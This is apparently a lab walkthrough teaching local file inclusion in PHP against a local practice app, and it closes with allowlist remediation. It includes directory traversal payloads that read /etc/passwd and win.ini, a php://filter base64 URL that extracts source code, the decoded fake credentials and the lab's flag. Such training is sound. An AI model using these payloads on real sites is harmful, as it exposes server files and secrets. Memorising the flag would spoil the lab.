# Lab 05 Walkthrough: Local File Inclusion & PHP Wrappers

Step-by-step guide to directory traversal, reading unparsed server source code using PHP filter stream wrappers, and understanding Log Poisoning.

---

## 🎯 The Mission
The target web application includes subpage templates using `?page=about.php`.
Clicking on `?page=secret_vault.php` reveals that variables are initialized, but the secret flag and database password inside the file are **not displayed** because PHP parses and executes the code on the server side instead of printing it!

Your goal:
1. Traverse directories to read system files.
2. Use PHP stream wrappers to dump the **unparsed PHP source code** of `secret_vault.php`.
3. Decode the base64 output and capture the flag: `FLAG{LFI_WRAPPER_SOURCE_EXTRACTED_GENIUS}`.

---

## 🔍 Vulnerability Analysis
Look at line 14 of `index.php`:
```php
$included = @include($page);
```
In PHP, the `include()` function accepts both filesystem file paths (e.g. `/etc/passwd` or `..\..\boot.ini`) AND **PHP Stream Wrappers** (e.g., `php://filter`, `data://`, `php://input`).

---

## 💥 Step-by-Step Exploitation

### 1. Directory Traversal / Reading System Files
Try passing a relative path to read files outside the web directory:
- On Windows:
  ```text
  ?page=C:/Windows/win.ini
  ?page=../../../../../../../../Windows/win.ini
  ```
- On Linux:
  ```text
  ?page=/etc/passwd
  ?page=../../../../etc/passwd
  ```
If the web server user has read permissions, the raw file contents will be displayed in the page body!

### 2. The Problem with Reading PHP Source Files Directly
If you attempt:
```text
?page=secret_vault.php
```
The server *executes* the PHP code. Any sensitive variables like `$database_password` or `$secret_flag` stay in server memory and are never sent to your browser!

### 3. Exploitation via the PHP Filter Wrapper (`php://filter`)
PHP provides a stream wrapper that can apply transformations (filters) to a file stream before it reaches the `include()` or `file_get_contents()` interpreter.

By using the **`convert.base64-encode`** filter, PHP encodes the raw PHP file into Base64 *before* executing it. Since Base64 text is not executable PHP code, the `include` statement treats it as plain text and prints the encoded string to the screen!

#### The Exploit URL:
```text
http://127.0.0.1:8888/Lab_05_LFI_and_Path_Traversal/?page=php://filter/convert.base64-encode/resource=secret_vault.php
```

#### The Result:
The browser outputs a Base64 string:
```text
PD9waHAKLy8gQ29uZmlkZW50YWwgSW50ZXJuYWwgQ29uZmlndXJhdGlvbgokbWFzdGVyX2FwaV9rZXkgPSAic2tfbGl2ZV85OTg4Nzc2NjU1NDQzMzIyMTEiOwokZGF0YWJhc2VfcGFzc3dvcmQgPSAiU3VwZXJFbmNyeXB0ZWRNYXN0ZXJQQHNzd29yZDIwMjYiOwokc2VjcmV0X2ZsYWcgPSAiRkxBR3tMRklfV1JBUFBFUl9TT1VSQ0VfRVhUUkFDVEVEX0dFTklVU30iOwo...
```

### 4. Decoding the Source Code
In your terminal:
```bash
# Using Linux / Mac / WSL:
echo "PD9waHAK..." | base64 -d

# Using PowerShell on Windows:
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PD9waHAK..."))
```

#### Decoded Source Code Revealed:
```php
<?php
// Confidental Internal Configuration
$master_api_key = "sk_live_998877665544332211";
$database_password = "SuperEncryptedMasterP@ssword2026";
$secret_flag = "FLAG{LFI_WRAPPER_SOURCE_EXTRACTED_GENIUS}";
```
You have successfully extracted the underlying server source code and the secret flag!

---

## 🛡️ Remediation (How to Fix It)

Never pass user input directly into file inclusion functions. Use an **explicit allowlist**:

```php
// SECURE CODE:
$allowed_pages = [
    'about.php' => 'about.php',
    'contact.php' => 'contact.php'
];

if (isset($_GET['page']) && array_key_exists($_GET['page'], $allowed_pages)) {
    include($allowed_pages[$_GET['page']]);
} else {
    include('about.php');
}
```
An allowlist makes both directory traversal and stream wrapper abuse impossible.
